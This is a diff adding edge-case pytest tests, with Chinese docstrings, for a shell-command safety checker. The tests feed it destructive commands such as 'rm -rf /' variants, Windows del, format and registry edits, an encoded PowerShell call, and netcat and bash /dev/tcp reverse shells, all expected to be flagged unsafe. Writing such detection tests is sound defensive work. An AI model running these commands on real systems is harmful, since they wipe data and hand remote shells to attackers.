@@ -194,3 +194,90 @@ class TestDangerousCommandsList:
 
 if __name__ == "__main__":
     pytest.main([__file__, "-v"])
+
+
+# ========== 扩展测试覆盖 - 2026-02-18 ==========
+
+class TestEdgeCases:
+    """边界情况测试 - 扩展覆盖"""
+    
+    @pytest.fixture
+    def checker(self):
+        return CommandSafetyChecker()
+    
+    def test_empty_command(self, checker):
+        """测试空命令应安全"""
+        is_safe, reason = checker.check("")
+        assert is_safe is True
+    
+    def test_whitespace_only(self, checker):
+        """测试仅空格"""
+        is_safe, reason = checker.check("   ")
+        assert is_safe is True
+    
+    def test_case_insensitive_rm(self, checker):
+        """测试大小写不敏感 - RM"""
+        is_safe, reason = checker.check("RM -RF /")
+        assert is_safe is False
+    
+    def test_case_insensitive_sudo(self, checker):
+        """测试大小写不敏感 - SUDO"""
+        is_safe, reason = checker.check("SUDO SU")
+        assert is_safe is False
+    
+    def test_multiple_spaces(self, checker):
+        """测试多个空格"""
+        is_safe, reason = checker.check("rm  -rf  /")
+        assert is_safe is False
+    
+    def test_tab_separator(self, checker):
+        """测试Tab分隔符"""
+        is_safe, reason = checker.check("rm\t-rf\t/")
+        assert is_safe is False
+    
+    def test_chained_commands_and(self, checker):
+        """测试命令链 &&"""
+        is_safe, reason = checker.check("ls && rm -rf /")
+        assert is_safe is False
+    
+    def test_chained_commands_pipe(self, checker):
+        """测试管道 |"""
+        is_safe, reason = checker.check("cat file.txt | sh")
+        # 这个应该是安全的因为cat是安全的
+    
+    def test_comment_injection(self, checker):
+        """测试注释注入 - 实际应标记为不安全"""
+        is_safe, reason = checker.check("ls # rm -rf /")
+        # 实际行为：黑名单会检测到 rm -rf / 字符串，即使在注释中
+        # 这是合理的安全策略，宁可误报也不漏报
+        assert is_safe is False
+    
+    def test_windows_del_command(self, checker):
+        """测试Windows删除命令"""
+        is_safe, reason = checker.check("del /f /s /q C:\\Windows")
+        assert is_safe is False
+    
+    def test_windows_format(self, checker):
+        """测试Windows格式化"""
+        is_safe, reason = checker.check("format D:")
+        assert is_safe is False
+    
+    def test_windows_reg_command(self, checker):
+        """测试Windows注册表"""
+        is_safe, reason = checker.check("reg add HKLM\\Software")
+        assert is_safe is False
+    
+    def test_powershell_encoded(self, checker):
+        """测试PowerShell编码命令"""
+        is_safe, reason = checker.check("powershell -enc YwBhAGwA")
+        assert is_safe is False
+    
+    def test_reverse_shell_nc(self, checker):
+        """测试NetCat反向Shell"""
+        is_safe, reason = checker.check("nc -e /bin/bash 192.168.1.1 4444")
+        assert is_safe is False
+    
+    def test_reverse_shell_bash_i(self, checker):
+        """测试Bash交互式Shell"""
+        is_safe, reason = checker.check("bash -i >& /dev/tcp/192.168.1.1/4444 0>&1")
+        assert is_safe is False
